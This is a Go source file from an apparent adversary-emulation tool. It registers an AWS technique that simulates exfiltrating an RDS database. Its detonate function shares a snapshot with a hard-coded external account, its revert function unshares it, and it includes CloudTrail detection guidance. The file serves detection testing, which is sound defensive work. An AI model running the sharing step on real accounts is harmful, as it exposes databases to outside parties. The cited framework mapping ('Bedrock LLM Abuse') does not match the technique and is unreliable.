package aws

import (
	"context"
	_ "embed"
	"errors"
	"github.com/aws/aws-sdk-go-v2/aws"
	"github.com/aws/aws-sdk-go-v2/service/rds"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus/mitreattack"
	"log"
)

//go:embed main.tf
var tf []byte

func init() {
	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
		ID:                 "aws.exfiltration.rds-share-snapshot",
		FriendlyName:       "Exfiltrate RDS Snapshot by Sharing",
		Platform:           stratus.AWS,
		IsSlow:             true,
		IsIdempotent:       true,
		MitreAttackTactics: []mitreattack.Tactic{mitreattack.Exfiltration},
		FrameworkMappings: []stratus.FrameworkMappings{
			{
				Framework: stratus.ThreatTechniqueCatalogAWS,
				Techniques: []stratus.TechniqueMapping{
					{
						Name: "Resource Hijacking: Cloud Service Hijacking - Bedrock LLM Abuse",
						ID:   "T1496.A007",
						URL:  "https://aws-samples.github.io/threat-technique-catalog-for-aws/Techniques/T1496.A007.html",
					},
				},
			},
		},
		Description: `
Shares a RDS Snapshot with an external AWS account to simulate an attacker exfiltrating a database.

Warm-up:

- Create a RDS Instance (slow, around 10 minutes)
- Create a RDS Snapshot

Detonation:

- Call rds:ModifyDBSnapshotAttribute to share the snapshot with an external AWS account
`,
		Detection: `
Through CloudTrail's <code>ModifyDBSnapshotAttribute</code> event, when both:

- <code>requestParameters.attributeName</code> is <code>restore</code>
- and, <code>requestParameters.launchPermission</code> shows that the RDS snapshot was shared with a new or unknown AWS account, such as:

<pre><code>"requestParameters": {
  "dBSnapshotIdentifier": "my-db-snapshot",
  "attributeName": "restore"
  "valuesToAdd": ["193672423079"],
}</code></pre>

An attacker can also make an RDS snapshot completely public. In this case, the value of <code>valuesToAdd</code> is <code>["all"]</code>. 
`,
		PrerequisitesTerraformCode: tf,
		Detonate:                   detonate,
		Revert:                     revert,
	})
}

var AccountIdToShareWith = []string{"193672423079"}

func detonate(params map[string]string, providers stratus.CloudProviders) error {
	snapshotId := params["snapshot_id"]
	rdsClient := rds.NewFromConfig(providers.AWS().GetConnection())

	log.Println("Sharing RDS Snapshot " + snapshotId + " with an external AWS account")
	_, err := rdsClient.ModifyDBSnapshotAttribute(context.Background(), &rds.ModifyDBSnapshotAttributeInput{
		DBSnapshotIdentifier: &snapshotId,
		AttributeName:        aws.String("restore"),
		ValuesToAdd:          AccountIdToShareWith,
	})

	if err != nil {
		return errors.New("unable to share RDS snapshot: " + err.Error())
	}

	return nil
}

func revert(params map[string]string, providers stratus.CloudProviders) error {
	snapshotId := params["snapshot_id"]
	rdsClient := rds.NewFromConfig(providers.AWS().GetConnection())

	log.Println("Un-sharing RDS Snapshot " + snapshotId + " with an external AWS account")
	_, err := rdsClient.ModifyDBSnapshotAttribute(context.Background(), &rds.ModifyDBSnapshotAttributeInput{
		DBSnapshotIdentifier: &snapshotId,
		AttributeName:        aws.String("restore"),
		ValuesToRemove:       AccountIdToShareWith,
	})

	if err != nil {
		return errors.New("unable to unshare RDS snapshot: " + err.Error())
	}

	return nil
}
